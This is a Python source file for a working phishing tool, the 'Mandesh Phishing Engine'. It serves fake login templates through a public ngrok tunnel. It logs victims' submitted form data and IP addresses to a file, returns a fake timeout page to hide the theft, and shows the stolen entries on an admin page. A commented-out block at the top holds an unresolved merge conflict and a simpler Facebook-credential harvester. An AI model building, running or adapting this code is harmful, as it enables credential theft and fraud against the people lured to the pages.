'''<<<<<<< HEAD
import os, datetime
from flask import Flask, render_template_string, request
from pyngrok import ngrok
from colorama import Fore, Style

app = Flask(__name__)
SELECTED_HTML = "index.html"
LOG_FILE = "captured.txt"

# --- Main Phishing Route ---
@app.route('/', methods=['GET', 'POST'])
def serve_content():
    global SELECTED_HTML
=======

import os, datetime, sys
from flask import Flask, render_template_string, request, send_from_directory
from pyngrok import ngrok
from colorama import Fore, Style
import logging

# Disable Flask default console logs for a cleaner Mandesh UI
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
# Global tracking for the selected template item
TARGET_ITEM = "" 
LOG_FILE = "mandesh_db/captured_creds.txt"

@app.route('/<path:filename>')
def custom_static(filename):
    # Static files are served from the root templates directory
    return send_from_directory("templates", filename)

@app.route('/', methods=['GET', 'POST'])
def serve_content():
    global TARGET_ITEM
>>>>>>> 9866c5a (Initial Private-Ready Release v1.2.2)
    if request.method == 'POST':
        data = request.form.to_dict()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] IP: {request.remote_addr} | Data: {data}\n")
<<<<<<< HEAD
        return "<h1>404 Connection Timeout</h1>"

    try:
        with open(f"templates/{SELECTED_HTML}", "r", encoding="utf-8") as f:
            return render_template_string(f.read())
    except FileNotFoundError:
        return f"<h1>Error: {SELECTED_HTML} not found in /templates</h1>", 404

# --- Admin Panel Route ---
=======
        # Fake timeout to look "broken" to the victim
        return "<title>404 Not Found</title><h1>404 Connection Timeout</h1>"

    # --- FIX: Handle both Folder and Standalone File ---
    template_path = os.path.join("templates", TARGET_ITEM)
    
    if os.path.isdir(template_path):
        index_file = os.path.join(template_path, "index.html")
    else:
        index_file = template_path

    try:
        with open(index_file, "r", encoding="utf-8") as f:
            return render_template_string(f.read())
    except Exception as e:
        return f"<h1>Error: Template path {index_file} is invalid.</h1>", 404

>>>>>>> 9866c5a (Initial Private-Ready Release v1.2.2)
@app.route('/admin')
def admin_panel():
    if not os.path.exists(LOG_FILE):
        return "<body style='background:#000;color:#0f0;'><h1>No data captured yet.</h1></body>"
    with open(LOG_FILE, "r") as f:
        logs = f.readlines()
<<<<<<< HEAD
    log_rows = "".join([f"<li>{line}</li>" for line in logs])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;'><h2>[!] Admin Logs</h2><ul>{log_rows}</ul></body></html>"

def start_engine():
    global SELECTED_HTML
    print(f"{Fore.RED}=== MANDESH PHISHING ENGINE v1.2.2 ==={Style.RESET_ALL}")
    
    if not os.path.exists("templates"): os.makedirs("templates")
    files = [f for f in os.listdir("templates") if f.endswith(".html")]
    
    if not files:
        print(f"{Fore.YELLOW}[!] No HTML files in /templates. Please add some!{Style.RESET_ALL}")
        return

    print("\nAvailable Pages:")
    for i, file in enumerate(files): print(f" [{i}] {file}")
    
    choice = input(f"\nSelect Page [Default: index.html]: ").strip()
    if choice == "":
        SELECTED_HTML = "index.html"
    else:
        try:
            SELECTED_HTML = files[int(choice)]
        except (ValueError, IndexError):
            SELECTED_HTML = "index.html"

    # Start Tunnel
    port = 8080
    url = ngrok.connect(port).public_url
    print(f"\n{Fore.MAGENTA}======================================")
    print(f"  TARGET LINK: {Fore.YELLOW}{url}")
    print(f"  ADMIN PANEL: {Fore.YELLOW}{url}/admin")
    print(f"{Fore.MAGENTA}======================================{Style.RESET_ALL}")
    
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == "__main__":
    start_engine()


#########
from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

# Core logic: Capture data and log it
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('email')
    password = request.form.get('pass')
    with open("credentials.txt", "a") as f:
        f.write(f"Target: {username} | Pass: {password}\n")
    return redirect("https://facebook.com") # Redirect to real site

@app.route('/')
def index():
    # We will build a template folder with different UI options
    return """
    <form action="/login" method="post">
        <input type="text" name="email" placeholder="Email" required><br>
        <input type="password" name="pass" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
    """

if __name__ == "__main__":
    print("[!] Mandesh Phish Engine Starting on Port 8080...")
    app.run(port=8080)

=======
    log_rows = "".join([f"<li style='margin-bottom:10px;'>{line}</li>" for line in logs])
    return f"""
    <html><head><title>Mandesh Admin</title></head>
    <body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>
    <h2>[!] MANDESH CAPTURE LOGS</h2><hr><ul>{log_rows}</ul>
    </body></html>"""

def start_engine():
    global TARGET_ITEM
    os.system('clear')
    print(f"{Fore.RED}=== MANDESH PHISHING ENGINE v1.2.2 ==={Style.RESET_ALL}")
    
    if not os.path.exists("templates"): os.makedirs("templates")
    if not os.path.exists("mandesh_db"): os.makedirs("mandesh_db")
    
    items = sorted(os.listdir("templates"))
    if not items:
        print(f"{Fore.YELLOW}[!] No templates found in /templates.{Style.RESET_ALL}")
        return

    print("\nAvailable Templates:")
    for i, item in enumerate(items):
        suffix = "[DIR]" if os.path.isdir(os.path.join("templates", item)) else "[FILE]"
        print(f" [{i}] {item} {Fore.CYAN}{suffix}{Style.RESET_ALL}")
    
    choice = input(f"\nSelect Template Number [0]: ").strip()
    idx = int(choice) if choice.isdigit() and int(choice) < len(items) else 0
    TARGET_ITEM = items[idx]

    # Ngrok Connection
    try:
        port = 8080
        url = ngrok.connect(port).public_url
        print(f"\n{Fore.MAGENTA}======================================")
        print(f"  TARGET LINK : {Fore.YELLOW}{url}")
        print(f"  ADMIN PANEL : {Fore.YELLOW}{url}/admin")
        print(f"  LOG FILE    : {Fore.YELLOW}{LOG_FILE}")
        print(f"{Fore.MAGENTA}======================================{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[*] Engine Started. Press CTRL+C to stop.{Style.RESET_ALL}")
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
        
    except Exception as e:
        print(f"{Fore.RED}[-] Ngrok/Flask Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    start_engine()
>>>>>>> 9866c5a (Initial Private-Ready Release v1.2.2)
'''





import os
import datetime
import sys
import logging
from flask import Flask, render_template_string, request, send_from_directory
from pyngrok import ngrok
from colorama import Fore, Style

# Disable Flask default console logs for a cleaner Mandesh UI
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Global tracking for the selected template item
TARGET_ITEM = "" 
LOG_FILE = "mandesh_db/captured_creds.txt"

@app.route('/<path:filename>')
def custom_static(filename):
    # Static files (CSS/JS/Images) are served from the root templates directory
    return send_from_directory("templates", filename)

@app.route('/', methods=['GET', 'POST'])
def serve_content():
    global TARGET_ITEM
    if request.method == 'POST':
        data = request.form.to_dict()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Ensure database directory exists
        if not os.path.exists("mandesh_db"):
            os.makedirs("mandesh_db")
            
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] IP: {request.remote_addr} | Data: {data}\n")
            
        # Fake timeout to appear "broken" to the victim after they submit
        return "<title>404 Not Found</title><h1>404 Connection Timeout</h1>"

    # Handle both Folder and Standalone File templates
    template_path = os.path.join("templates", TARGET_ITEM)
    
    if os.path.isdir(template_path):
        index_file = os.path.join(template_path, "index.html")
    else:
        index_file = template_path

    try:
        with open(index_file, "r", encoding="utf-8") as f:
            return render_template_string(f.read())
    except Exception:
        return f"<h1>Error: Template path {index_file} is invalid or missing index.html.</h1>", 404

@app.route('/admin')
def admin_panel():
    if not os.path.exists(LOG_FILE):
        return "<body style='background:#000;color:#0f0;'><h1>No data captured yet.</h1></body>"
    
    with open(LOG_FILE, "r") as f:
        logs = f.readlines()
        
    log_rows = "".join([f"<li style='margin-bottom:10px; border-bottom:1px solid #333;'>{line}</li>" for line in logs])
    
    return f"""
    <html>
    <head><title>Mandesh Admin</title></head>
    <body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>
        <h2>[!] MANDESH CAPTURE LOGS</h2>
        <hr color='#333'>
        <ul style='list-style:none; padding:0;'>{log_rows}</ul>
    </body>
    </html>
    """

def start_engine():
    global TARGET_ITEM
    os.system('clear')
    print(f"{Fore.RED}=== MANDESH PHISHING ENGINE v1.2.2 ==={Style.RESET_ALL}")
    
    # Initialization
    if not os.path.exists("templates"): 
        os.makedirs("templates")
    if not os.path.exists("mandesh_db"): 
        os.makedirs("mandesh_db")
    
    items = sorted(os.listdir("templates"))
    if not items:
        print(f"{Fore.YELLOW}[!] No templates found in /templates. Add index.html files there!{Style.RESET_ALL}")
        return

    print("\nAvailable Templates:")
    for i, item in enumerate(items):
        path = os.path.join("templates", item)
        suffix = "[DIR]" if os.path.isdir(path) else "[FILE]"
        print(f" [{i}] {item} {Fore.CYAN}{suffix}{Style.RESET_ALL}")
    
    try:
        choice = input(f"\nSelect Template Number [Default 0]: ").strip()
        idx = int(choice) if choice.isdigit() and int(choice) < len(items) else 0
        TARGET_ITEM = items[idx]

        # Ngrok Tunneling
        port = 8080
        url = ngrok.connect(port).public_url
        
        print(f"\n{Fore.MAGENTA}======================================")
        print(f"  TARGET LINK : {Fore.YELLOW}{url}")
        print(f"  ADMIN PANEL : {Fore.YELLOW}{url}/admin")
        print(f"  LOG FILE    : {Fore.YELLOW}{LOG_FILE}")
        print(f"{Fore.MAGENTA}======================================{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[*] Engine Started. Press CTRL+C to stop.{Style.RESET_ALL}")
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Shutting down...{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    start_engine()
